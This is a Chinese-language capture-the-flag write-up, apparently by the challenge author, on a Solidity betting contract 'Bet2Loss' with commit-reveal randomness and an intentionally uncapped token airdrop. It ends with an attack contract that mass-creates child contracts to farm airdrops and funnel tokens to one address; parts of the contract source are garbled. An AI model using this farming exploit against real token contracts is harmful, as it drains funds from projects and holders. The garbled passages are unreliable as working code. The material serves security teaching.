     * Originally based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol
     */
    contract ERC20{
        using SafeMath for uint256;
        mapping (address => uint256) public balances;
        uint256 public _totalSupply;
        /**
        * @dev Total number of tokens in existence
        */
        function totalSupply() public view returns (uint256) {
            return _totalSupply;
        }
        /**
        * @dev Gets the balance of the specified address.
        * @param owner The address to query the balance of.
        * @return An uint256 representing the amount owned by the passed address.
        */
        function balanceOf(address owner) public view returns (uint256) {
            return balances[owner];
        }
        function transfer(address _to, uint _value) public returns (bool success){
            balances[msg.sender] = balances[msg.sender].sub(_value);
            balances[_to] = balances[_to].add(_value);
            return true;
        }
    }
    contract B2GBToken is ERC20 {
        string public constant name = "test";
        string public constant symbol = "test";
        uint8 public constant decimals = 18;
        uint256 public constant _airdropAmount = 1000;
        uint256 public constant INITIAL_SUPPLY = 20000000000 * (10 ** uint256(decimals));
        mapping(address => bool) initialized;
        /**
        * @dev Constructor that gives msg.sender all of existing tokens.
        */
        constructor() public {
            initialized[msg.sender] = true;
            _totalSupply = INITIAL_SUPPLY;
            balances[msg.sender] = INITIAL_SUPPLY;
        }
        // airdrop
        function AirdropCheck() internal returns (bool success){
             if (!initialized[msg.sender]) {
                initialized[msg.sender] = true;
                balances[msg.sender] = _airdropAmount;
                _totalSupply += _airdropAmount;
            }
            return true;
        }
    }
    // 主要代码
    contract Bet2Loss is B2GBToken{
            /// *** Constants section
            // Bets lower than this amount do not participate in jackpot rolls (and are
            // not deducted JACKPOT_FEE).
            uint constant MIN_JACKPOT_BET = 0.1 ether;
            // There is minimum and maximum bets.
            uint constant MIN_BET = 1;
            uint constant MAX_BET = 100000;
            // Modulo is a number of equiprobable outcomes in a game:
            //  - 2 for coin flip
            //  - 6 for dice
            //  - 6*6 = 36 for double dice
            //  - 100 for etheroll
            //  - 37 for roulette
            //  etc.
            // It's called so because 256-bit entropy is treated like a huge integer and
            // the remainder of its division by modulo is considered bet outcome.
            uint constant MAX_MODULO = 100;
            // EVM BLOCKHASH opcode can query no further than 256 blocks into the
            // past. Given that settleBet uses block hash of placeBet as one of
            // complementary entropy sources, we cannot process bets older than this
            // threshold. On rare occasions dice2.win croupier may fail to invoke
            // settleBet in this timespan due to technical issues or extreme Ethereum
            // congestion; such bets can be refunded via invoking refundBet.
            uint constant BET_EXPIRATION_BLOCKS = 250;
            // Some deliberately invalid address to initialize the secret signer with.
            // Forces maintainers to invoke setSecretSigner before processing any bets.
            address constant DUMMY_ADDRESS = 0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C;
            // Standard contract ownership transfer.
            address public owner;
            address private nextOwner;
            // Adjustable max bet profit. Used to cap bets against dynamic odds.
            uint public maxProfit;
            // The address corresponding to a private key used to sign placeBet commits.
            address public secretSigner;
            // Accumulated jackpot fund.
            uint128 public jackpotSize;
            // Funds that are locked in potentially winning bets. Prevents contract from
            // committing to bets it cannot pay out.
            uint128 public lockedInBets;
            // A structure representing a single bet.
            struct Bet {
                    // Wager amount in wei.
                    uint betnumber;
                    // Modulo of a game.
                    uint8 modulo;
                    // Block number of placeBet tx.
                    uint40 placeBlockNumber;
                    // Bit mask representing winning bet outcomes (see MAX_MASK_MODULO comment).
                    uint40 mask;
                    // Address of a gambler, used to pay out winning bets.
                    address gambler;
            }
            // Mapping from commits to all currently active & processed bets.
            mapping (uint => Bet) bets;
            // Events that are issued to make statistic recovery easier.
            event FailedPayment(address indexed beneficiary, uint amount);
            event Payment(address indexed beneficiary, uint amount);
            // This event is emitted in placeBet to record commit in the logs.
            event Commit(uint commit);
            event GetFlag(
                string b64email,
                string back
            );
            // Constructor. Deliberately does not take any parameters.
            constructor () public {
                    owner = msg.sender;
                    secretSigner = DUMMY_ADDRESS;
            }
            // Standard modifier on methods invokable only by contract owner.
            modifier onlyOwner {
                    require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
                    _;
            }
            // See comment for "secretSigner" variable.
            function setSecretSigner(address newSecretSigner) external onlyOwner {
                    secretSigner = newSecretSigner;
            }
            /// *** Betting logic
            // Bet states:
            //  amount == 0 && gambler == 0 - 'clean' (can place a bet)
            //  amount != 0 && gambler != 0 - 'active' (can be settled or refunded)
            //  amount == 0 && gambler != 0 - 'processed' (can clean storage)
            //
            //  NOTE: Storage cleaning is not implemented in this contract version; it will be added
            //              with the next upgrade to prevent polluting Ethereum state with expired bets.
            // Bet placing transaction - issued by the player.
            //  betMask              - bet outcomes bit mask for modulo  betmask
                    require (balances[msg.sender] >= betnumber, "no more balances");
                    // Validate input data ranges.
                    require (modulo > 1 && modulo = 0 && betMask  0 && betnumber  placeBlockNumber, "settleBet in the same block as placeBet, or before.");
                    require (block.number  10000000);
                emit GetFlag(b64email, "Get flag!");
            }
    }
这是一个比较经典的赌博合约，用的是市面上比较受认可的hash-reveal-commit模式来验证随机数。在之前的dice2win分析中，我讨论过这个制度的合理性，除非选择终止，否则可以保证一定程度的公平。
代码比较长，我在修改dice2win的时候还留了很多无用代码，可以不用太纠结。流程大致如下：
1、在页面中点击下注
![
](https://images.seebug.org/content/images/2018/11/cdd92a8e-7c4c-4271-bcf7-04c3ef23ea63.png-w331s)
2、后端生成随机数，然后签名，饭后commit, r, s, v
        # 随机数
        reveal = random_num()
        result['commit'] = "0x"+sha3.keccak_256(bytes.fromhex(binascii.hexlify(reveal.to_bytes(32, 'big')).decode('utf-8'))).hexdigest()
        # web3获取当前blocknumber
        result['commitLastBlock'] = w3.eth.blockNumber + 250
        message = binascii.hexlify(result['commitLastBlock'].to_bytes(32,'big')).decode('utf-8')+result['commit'][2:]
        message_hash = '0x'+sha3.keccak_256(bytes.fromhex(message)).hexdigest()
        signhash = w3.eth.account.signHash(message_hash, private_key=private_key)
        result['signature'] = {}
        result['signature']['r'] = '0x' + binascii.hexlify((signhash['r']).to_bytes(32,'big')).decode('utf-8')
        result['signature']['s'] = '0x' + binascii.hexlify((signhash['s']).to_bytes(32,'big')).decode('utf-8')
        result['signature']['v'] = signhash['v']
3、回到前端，web3.js配合返回的数据，想meta发起交易，交易成功被打包之后向后台发送请求settlebet。
4、后端收到请求之后对该commit做开奖
    transaction = bet2loss.functions.settleBet(int(reveal)).buildTransaction(
        {'chainId': 3, 'gas': 70000, 'nonce': nonce, 'gasPrice': w3.toWei('1', 'gwei')})
    signed = w3.eth.account.signTransaction(transaction, private_key)
    result = w3.eth.sendRawTransaction(signed.rawTransaction)
5、开奖成功
在这个过程中，用户得不到随机数，服务端也不能对随机数做修改，这就是现在比较常用的hash-reveal-commit随机数生成方案。
整个流程逻辑比较严谨。但有一个我预留的问题， **空投** 。
在游戏中，我设定了每位参赛玩家都会空投1000个D2GB，而且没有设置上限，如果注册10000个账号，然后转账给一个人，那么你就能获得相应的token，这个操作叫
**薅羊毛** ，曾经出过不少这样的事情。
这其中有些很有趣的操作，首先，如果你一次交易一次交易去跑，加上打包的时间，10000次基本上不可能。
所以新建一个合约，然后通过合约来新建合约转账才有可能实现。
这其中还有一个很有趣的问题，循环新建合约，在智能合约中是一个消耗gas很大的操作。如果一次交易耗费的gas过大，那么交易就会失败，它就不会被打包。
简单的测试可以发现，大约50次循环左右gas刚好够用。攻击代码借用了@sissel的
    pragma solidity ^0.4.20;
    contract Attack_7878678 {
    //    address[] private son_list;
        function Attack_7878678() payable {}
        function attack_starta(uint256 reveal_num) public {
            for(int i=0;i<=50;i++){
                son = new Son(reveal_num);
            }
        }
        function () payable {
        }
    }
    contract Son_7878678 {
        function Son_7878678(uint256 reveal_num) payable {
            address game = 0x006b9bc418e43e92cf8d380c56b8d4be41fda319;
            game.call(bytes4(keccak256("settleBet(uint256)")),reveal_num);
            game.call(bytes4(keccak256("transfer(address,uint256)")),0x5FA2c80DB001f970cFDd388143b887091Bf85e77,950);
        }
        function () payable{
        }
    }
跑个200次就ok了
* * *